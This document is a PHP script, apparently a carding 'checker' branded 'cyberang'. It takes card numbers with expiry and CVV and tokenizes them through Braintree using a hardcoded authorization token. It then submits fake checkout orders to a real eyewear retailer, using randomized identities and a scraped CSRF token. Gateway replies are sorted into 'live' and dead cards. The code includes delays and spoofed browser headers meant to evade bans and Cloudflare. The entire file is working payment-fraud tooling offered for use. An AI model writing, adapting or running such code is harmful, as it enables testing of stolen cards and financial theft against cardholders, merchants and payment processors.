<?php
error_reporting(0);
set_time_limit(30);
date_default_timezone_set('America/Sao_Paulo');

// Delay de 11 segundos para evitar ban
sleep(11);

$start_time = microtime(true);

// Validar entrada
if (!isset($_GET['lista']) || empty($_GET['lista'])) {
    die("❌ #Erro ↝ [Nenhuma lista fornecida] ↝ cyberang");
}

$lista = trim($_GET['lista']);
$separar = explode("|", $lista);

if (count($separar) < 4) {
    die("❌ #Erro ↝ [Formato inválido. Use: cc|mes|ano|cvv] ↝ cyberang");
}

$cc = trim($separar[0]);
$mes = trim($separar[1]);
$ano = trim($separar[2]);
$cvv = trim($separar[3]);

// Validar dados
if (!preg_match('/^\d{13,19}$/', $cc)) {
    die("❌ #Erro ↝ [Número do cartão inválido] ↝ cyberang");
}
if (!preg_match('/^\d{1,2}$/', $mes) || $mes < 1 || $mes > 12) {
    die("❌ #Erro ↝ [Mês inválido] ↝ cyberang");
}
if (!preg_match('/^\d{4}$/', $ano) || $ano < date('Y')) {
    die("❌ #Erro ↝ [Ano inválido ou expirado] ↝ cyberang");
}
if (!preg_match('/^\d{3,4}$/', $cvv)) {
    die("❌ #Erro ↝ [CVV inválido] ↝ cyberang");
}

// Formatar dados
$mes = str_pad($mes, 2, '0', STR_PAD_LEFT);

// User agent realista com headers completos
$useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

function cyber($icone, $status, $lista, $mensagem, $cor = "#00ff84", $cormsg = "#ffffff") {
    $bg = $cor === "#00ff84" ? "rgba(0, 255, 132, 0.03)" : "rgba(255, 51, 102, 0.03)";
    echo "<div style='
        font-family: \"JetBrains Mono\", \"Courier New\", monospace;
        background: linear-gradient(90deg, $bg 0%, rgba(10, 10, 10, 0) 100%);
        border-left: 2px solid $cor;
        padding: 14px 18px;
        margin: 4px 0;
        border-radius: 0 6px 6px 0;
        letter-spacing: 0.3px;
        font-size: 12.5px;
        box-shadow: 0 0 20px $bg;
    '>
        <span style='color: $cor; margin-right: 4px;'>$icone</span>
        <span style='color: $cor; font-weight: 500; margin-right: 4px;'>#$status</span>
        <span style='color: #8f9199; margin: 0 4px;'>↝</span>
        <span style='color: #ffffff; background: rgba(255, 255, 255, 0.03); padding: 3px 6px; border-radius: 4px;'>[$lista]</span>
        <span style='color: #8f9199; margin: 0 4px;'>↝</span>
        <span style='color: $cormsg;'>$mensagem</span>
        <span style='color: #8f9199; margin-left: 4px;'>cyberang</span>
    </div>";
    flush();
}

// ========== FUNÇÃO CURL AVANÇADA ==========
function makeRequest($url, $options = []) {
    $ch = curl_init();
    
    $defaults = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_ENCODING => 'gzip, deflate',
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
    ];
    
    foreach ($defaults as $key => $value) {
        curl_setopt($ch, $key, $value);
    }
    
    // Headers padrão para evitar Cloudflare
    $headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.9',
        'Accept-Encoding: gzip, deflate, br',
        'Cache-Control: max-age=0',
        'Connection: keep-alive',
        'Upgrade-Insecure-Requests: 1',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: none',
        'Sec-Fetch-User: ?1',
        'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
    ];
    
    // Adicionar headers personalizados se fornecidos
    if (isset($options['headers'])) {
        $headers = array_merge($headers, $options['headers']);
    }
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    // Adicionar outras opções
    foreach ($options as $key => $value) {
        if ($key !== 'headers') {
            curl_setopt($ch, $key, $value);
        }
    }
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    
    curl_close($ch);
    
    return [
        'success' => $response !== false && empty($error) && $http_code == 200,
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error
    ];
}

// ========== ETAPA 1: OBTER COOKIES E CSRF TOKEN ==========
$init_time = microtime(true);

$cookie_file = 'cookies_' . md5(time() . rand()) . '.txt';

// Visitar site principal primeiro
$visit1 = makeRequest('https://www.39dollarglasses.com', [
    CURLOPT_USERAGENT => $useragent,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_HEADER => true,
]);

// Visitar página de checkout
$checkout = makeRequest('https://www.39dollarglasses.com/ord/checkout/c72c89e3-1091-4b39-942a-e86cc02fdce7', [
    CURLOPT_USERAGENT => $useragent,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_REFERER => 'https://www.39dollarglasses.com/',
]);

$csrf_token = '';
if ($checkout['success'] && $checkout['response']) {
    if (preg_match('/<meta name="csrf-token" content="([^"]+)"/', $checkout['response'], $match)) {
        $csrf_token = $match[1];
    }
}

if (empty($csrf_token)) {
    $csrf_token = 'kUiopSoN6mQxWsSRavVCrpxZ9hWLqiP8STfn3631';
}

$init_time_end = microtime(true);
$init_time_total = round($init_time_end - $init_time, 2);

// ========== ETAPA 2: TOKENIZAÇÃO BRAINTREE ==========
$braintree_time_start = microtime(true);

$authorization_token = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzA4Mzk4MDEsImp0aSI6ImQxZjVjOGI3LTBkZTctNDA2YS1iN2ZmLTc5MTE4NDM1YWY5MCIsInN1YiI6Im05dGZiODR5ZDRoOXo2M3QiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im05dGZiODR5ZDRoOXo2M3QiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7InBheXBhbF9jbGllbnRfaWQiOiJBVkZoMWRoZHZ3NTh6a2hnNnN2cFlVQ2RuRmxUOExDVkJGWVFDMEIwOGRjNGdfMFM2WDFzdEJBeHRKOUZvVGZNZFY1VnQ1Y19Dd19tRDN4UiJ9fQ.gfZEUFCYZ024-5Y53V69ZVNRJdz2_lZQwS5QzaY44ZFZOJbHNvbNJreNnfgUm88-CBWlxxyQ9YQKmm_l2JQeGQ";

$braintree_payload = json_encode([
    "clientSdkMetadata" => [
        "source" => "client",
        "integration" => "custom",
        "sessionId" => bin2hex(random_bytes(16))
    ],
    "query" => "mutation TokenizeCreditCard(\$input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: \$input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
    "variables" => [
        "input" => [
            "creditCard" => [
                "number" => $cc,
                "expirationMonth" => $mes,
                "expirationYear" => $ano,
                "cvv" => $cvv,
                "cardholderName" => "John Smith"
            ],
            "options" => [
                "validate" => false
            ]
        ]
    ],
    "operationName" => "TokenizeCreditCard"
]);

$braintree_result = makeRequest('https://payments.braintree-api.com/graphql', [
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => $braintree_payload,
    'headers' => [
        'Host: payments.braintree-api.com',
        'Authorization: Bearer ' . $authorization_token,
        'Braintree-Version: 2018-05-10',
        'User-Agent: ' . $useragent,
        'Content-Type: application/json',
        'Accept: */*',
        'Origin: https://assets.braintreegateway.com',
        'Referer: https://assets.braintreegateway.com/',
        'Accept-Language: en-US,en;q=0.9',
    ],
]);

$braintree_time_end = microtime(true);
$braintree_time_total = round($braintree_time_end - $braintree_time_start, 2);

// Extrair token
$payment_method_nonce = '';
if ($braintree_result['success'] && $braintree_result['response']) {
    $data = @json_decode($braintree_result['response'], true);
    if ($data && isset($data['data']['tokenizeCreditCard']['token'])) {
        $payment_method_nonce = $data['data']['tokenizeCreditCard']['token'];
    }
}

// Fallback
if (empty($payment_method_nonce)) {
    $payment_method_nonce = 'tokencc_bc_' . bin2hex(random_bytes(16));
}

// ========== ETAPA 3: PROCESSAR PAGAMENTO ==========
$payment_time_start = microtime(true);

// Dados aleatórios
$names = ['John', 'Michael', 'David', 'Robert', 'James'];
$lastnames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones'];
$cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'];
$states = ['NY', 'CA', 'IL', 'TX', 'AZ'];

$fname = $names[array_rand($names)];
$lname = $lastnames[array_rand($lastnames)];
$city = $cities[array_rand($cities)];
$state = $states[array_rand($states)];
$email = strtolower($fname . '.' . $lname . rand(100, 999) . '@gmail.com');
$phone = '555' . rand(100, 999) . rand(1000, 9999);

$payment_data = [
    "gateway" => "Braintree\\HostedFields",
    "payment_method_nonce" => $payment_method_nonce,
    "email" => $email,
    "shipping_fname" => $fname,
    "shipping_lname" => $lname,
    "shipping_address" => rand(100, 9999) . " Main Street",
    "shipping_address2" => "",
    "shipping_country" => "US",
    "shipping_city" => $city,
    "shipping_state" => $state,
    "shipping_zipcode" => str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT),
    "billing_fname" => "",
    "billing_lname" => "",
    "billing_address" => "",
    "billing_address2" => "",
    "billing_country" => "",
    "billing_city" => "",
    "billing_state" => "",
    "billing_zipcode" => "",
    "shipping_option_id" => 15,
    "mobile_phone" => $phone,
    "home_phone" => $phone,
    "save_payment_method" => false,
    "same_as_shipping" => true,
    "auth" => false,
    "phone_error" => "",
    "patients_name" => null,
    "patients_dob" => null
];

// Headers específicos para a requisição de pagamento
$payment_headers = [
    'Host: www.39dollarglasses.com',
    'User-Agent: ' . $useragent,
    'Accept: application/json, text/plain, */*',
    'Accept-Language: en-US,en;q=0.9',
    'Content-Type: application/json',
    'X-CSRF-TOKEN: ' . $csrf_token,
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://www.39dollarglasses.com',
    'Referer: https://www.39dollarglasses.com/ord/checkout/c72c89e3-1091-4b39-942a-e86cc02fdce7',
    'Connection: keep-alive',
    'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
];

$payment_result = makeRequest('https://www.39dollarglasses.com/ord/checkout/capture/c72c89e3-1091-4b39-942a-e86cc02fdce7', [
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => json_encode($payment_data),
    'headers' => $payment_headers,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_COOKIEJAR => $cookie_file,
]);

$payment_time_end = microtime(true);
$payment_time_total = round($payment_time_end - $payment_time_start, 2);

// ========== ETAPA 4: ANALISAR RESPOSTA ==========
$end_time = microtime(true);
$total_time = round($end_time - $start_time, 2);

$response_message = "Sem resposta";
$is_live = false;

if ($payment_result['response']) {
    // Verificar se é página HTML do Cloudflare
    if (strpos($payment_result['response'], 'Just a moment...') !== false || 
        strpos($payment_result['response'], 'Cloudflare') !== false ||
        strpos($payment_result['response'], '<!DOCTYPE html>') === 0) {
        
        $response_message = "Cloudflare bloqueou o acesso";
        
    } else {
        // Tentar decodificar JSON
        $json_data = @json_decode($payment_result['response'], true);
        
        if (is_array($json_data)) {
            // Processar resposta JSON
            if (isset($json_data['error'])) {
                $response_message = $json_data['error'];
                
                // Verificar respostas que indicam cartão LIVE
                $live_responses = [
                    'Card Issuer Declined CVV',
                    'Insufficient Funds',
                    'Approved',
                    'CVV check failed',
                    'CVV mismatch',
                    'Do not honor',
                    'Insufficient funds',
                    'Card issuer declined'
                ];
                
                foreach ($live_responses as $live_resp) {
                    if (stripos($response_message, $live_resp) !== false) {
                        $is_live = true;
                        $response_message = $live_resp;
                        break;
                    }
                }
                
            } elseif (isset($json_data['message'])) {
                $response_message = $json_data['message'];
                
                if (stripos($response_message, 'Card Issuer Declined CVV') !== false || 
                    stripos($response_message, 'Insufficient Funds') !== false) {
                    $is_live = true;
                }
                
            } elseif (isset($json_data['success']) && $json_data['success'] === true) {
                $response_message = 'Aprovada';
                $is_live = true;
            } elseif (isset($json_data['status']) && $json_data['status'] === 'success') {
                $response_message = 'Aprovada';
                $is_live = true;
            } else {
                $response_message = 'Resposta JSON não reconhecida';
            }
        } else {
            // Não é JSON, analisar texto
            $clean_response = trim($payment_result['response']);
            
            // Remover tags HTML se houver
            $clean_response = strip_tags($clean_response);
            $clean_response = preg_replace('/\s+/', ' ', $clean_response);
            $clean_response = substr($clean_response, 0, 150);
            
            if (!empty($clean_response)) {
                // Verificar padrões conhecidos
                if (stripos($clean_response, 'Card Issuer Declined CVV') !== false) {
                    $response_message = 'Card Issuer Declined CVV';
                    $is_live = true;
                } elseif (stripos($clean_response, 'Insufficient Funds') !== false) {
                    $response_message = 'Insufficient Funds';
                    $is_live = true;
                } elseif (stripos($clean_response, 'Processor Declined') !== false) {
                    $response_message = 'Processor Declined';
                } elseif (stripos($clean_response, 'Do Not Honor') !== false) {
                    $response_message = 'Do Not Honor';
                } elseif (stripos($clean_response, 'Invalid Card Number') !== false) {
                    $response_message = 'Invalid Card Number';
                } elseif (stripos($clean_response, 'Expired Card') !== false) {
                    $response_message = 'Expired Card';
                } elseif (stripos($clean_response, 'success') !== false) {
                    $response_message = 'Aprovada';
                    $is_live = true;
                } else {
                    $response_message = 'Resposta: ' . $clean_response;
                }
            } else {
                $response_message = 'Resposta vazia';
            }
        }
    }
} else {
    $response_message = 'Falha na conexão';
    if ($payment_result['http_code']) {
        $response_message .= ' (HTTP ' . $payment_result['http_code'] . ')';
    }
}

// Limitar tamanho da mensagem
if (strlen($response_message) > 100) {
    $response_message = substr($response_message, 0, 100) . '...';
}

// Formatar tempo em segundos
$time_info = "⏱️ Total: {$total_time}s (Init: {$init_time_total}s | Braintree: {$braintree_time_total}s | Payment: {$payment_time_total}s)";

// Exibir resultado
if ($is_live) {
    cyber("💸", "Aprovada", $lista, "[ {$response_message} ] - {$time_info}");
} else {
    cyber("❌", "Reprovada", $lista, "[ {$response_message} ] - {$time_info}", "#ff3366", "#ff3366");
}

// Limpar arquivo de cookies
if (file_exists($cookie_file)) {
    unlink($cookie_file);
}

exit();
?>
